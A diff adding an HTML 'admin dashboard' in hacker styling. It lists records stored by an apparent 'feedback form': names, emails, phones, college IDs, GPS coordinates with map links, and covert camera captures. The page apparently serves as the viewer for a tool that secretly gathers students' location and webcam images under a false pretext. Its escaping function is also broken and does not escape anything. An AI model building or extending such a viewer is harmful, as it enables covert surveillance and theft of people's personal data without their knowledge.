@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>ADMIN DASHBOARD</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:"Courier New",monospace; background:#05060a; color:#39ff14; min-height:100vh; padding:1.5rem; }
+  h1 { color:#ff0040; text-shadow:0 0 12px #ff0040; letter-spacing:4px; }
+  .toolbar { margin:1rem 0; }
+  button { background:#111; color:#39ff14; border:1px solid #39ff14; padding:0.5rem 1rem; cursor:pointer; font-family:inherit; margin-right:0.5rem; border-radius:4px; }
+  button:hover { background:#39ff14; color:#000; }
+  button.danger { border-color:#ff0040; color:#ff0040; }
+  .card { border:1px solid #39ff14; padding:1rem; margin:1rem 0; border-radius:6px; background:rgba(0,20,0,0.3); }
+  .row { display:flex; justify-content:space-between; padding:0.35rem 0; border-bottom:1px dashed #39ff1433; font-size:0.9rem; }
+  .row:last-child { border:none; }
+  .row span:first-child { color:#8b949e; }
+  .row span:last-child { color:#39ff14; text-align:right; word-break:break-all; }
+  img { border:1px solid #39ff14; border-radius:6px; max-width:300px; display:block; margin:0.5rem 0; }
+  .empty { color:#8b949e; text-align:center; padding:2rem; }
+  #toast { position:fixed; bottom:1rem; left:50%; transform:translateX(-50%); background:#111; border:1px solid #39ff14; padding:0.5rem 1rem; border-radius:4px; font-size:0.85rem; }
+</style>
+</head>
+<body>
+  <h1>ADMIN DASHBOARD</h1>
+  <div class="toolbar">
+    <button onclick="load()">Refresh</button>
+    <button class="danger" onclick="clearAll()">Wipe Data</button>
+  </div>
+  <div id="list"></div>
+  <div id="toast"></div>
+<script>
+  function esc(s){ return String(s).replace(/[&<>"]/g, c => ({'&':'&','<':'<','>':'>','"':'"'}[c])); }
+  function toast(m){ const t=document.getElementById('toast'); t.textContent=m; t.style.display='block'; setTimeout(()=>t.style.display='none',1800); }
+  function load(){
+    const raw = localStorage.getItem('fb_entries');
+    const entries = raw ? JSON.parse(raw) : [];
+    const list = document.getElementById('list');
+    if(!entries.length){ list.innerHTML='<div class="card empty">No data yet. Submit the feedback form to capture a record.</div>'; return; }
+    list.innerHTML = entries.slice().reverse().map((e,i)=>`
+      <div class="card">
+        <h3 style="color:#ff0040;margin-bottom:0.5rem">Record #${entries.length-i}</h3>
+        <div class="row"><span>Name</span><span>${esc(e.name||'--')}</span></div>
+        <div class="row"><span>Email</span><span>${esc(e.email||'--')}</span></div>
+        <div class="row"><span>Phone</span><span>${esc(e.phone||'--')}</span></div>
+        <div class="row"><span>College ID</span><span>${esc(e.collegeId||'--')}</span></div>
+        <div class="row"><span>Time</span><span>${esc(e.time||'--')}</span></div>
+        <div class="row"><span>LAT</span><span>${esc(e.lat||'--')}</span></div>
+        <div class="row"><span>LNG</span><span>${esc(e.lng||'--')}</span></div>
+        ${e.lat&&e.lng&&e.lat!=='--'?`<div class="row"><span>MAP</span><span><a href="https://www.google.com/maps/search/?api=1&query=${e.lat},${e.lng}" target="_blank">open in maps</a></span></div>`:''}
+        ${e.camshot?`<div style="margin-top:0.6rem"><span style="color:#8b949e">CAMERA CAPTURE</span><br><img src="${e.camshot}"></div>`:`<div style="margin-top:0.6rem;color:#8b949e">no camera capture</div>`}
+      </div>`).join('');
+  }
+  function clearAll(){
+    localStorage.removeItem('fb_entries');
+    toast('DATA WIPED');
+    load();
+  }
+  load();
+</script>
+</body>
+</html>
